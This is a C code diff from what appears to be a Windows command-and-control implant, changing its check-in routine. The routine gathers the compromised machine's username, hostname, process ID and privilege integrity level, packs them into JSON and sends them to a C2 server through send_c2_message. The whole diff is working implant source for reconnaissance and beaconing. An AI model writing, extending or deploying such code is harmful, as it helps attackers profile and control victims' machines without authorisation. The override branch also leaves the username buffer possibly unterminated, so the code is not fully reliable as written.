@@ -11,14 +11,18 @@ extern char current_uuid[128];
 
 #include <windows.h>
 
-BOOL CheckinSend() {
+BOOL CheckinSend(char *override_user) {
   char json_msg[4096];
   DWORD mypid = GetCurrentProcessId();
 
-  char username[256];
-  DWORD username_len = sizeof(username);
-  if (!GetUserName(username, &username_len)) {
-    strncpy(username, "UNKNOWN", sizeof(username));
+  char username[512];
+  if (override_user != NULL) {
+    strncpy(username, override_user, sizeof(username) - 1);
+  } else {
+    DWORD username_len = sizeof(username);
+    if (!GetUserNameA(username, &username_len)) {
+      strncpy(username, "UNKNOWN", sizeof(username));
+    }
   }
 
   char hostname[256];
@@ -30,14 +34,22 @@ BOOL CheckinSend() {
   // Clean up username/hostname (sometimes contain garbage if buffer verified
   // strictly?) GetUserName returns null-terminated string.
 
+  int integrity = get_integrity_level();
+
+  char *escaped_user = json_escape(username);
+  char *escaped_host = json_escape(hostname);
+
   // Construct Checkin JSON
-  // TODO: Implement dynamic IP and OS retrieval later if needed
   snprintf(json_msg, sizeof(json_msg),
            "{\"action\": \"checkin\", \"uuid\": \"%s\", \"ips\": "
            "[\"127.0.0.1\"], \"os\": \"windows\", \"user\": \"%s\", "
            "\"host\": \"%s\", \"pid\": %lu, \"architecture\": \"x64\", "
-           "\"domain\": \"%s\"}",
-           current_uuid, username, hostname, mypid, hostname);
+           "\"domain\": \"%s\", \"integrity_level\": %d}",
+           current_uuid, escaped_user, escaped_host, mypid, escaped_host,
+           integrity);
+
+  free(escaped_user);
+  free(escaped_host);
 
   char *b64_resp = send_c2_message(json_msg);
 
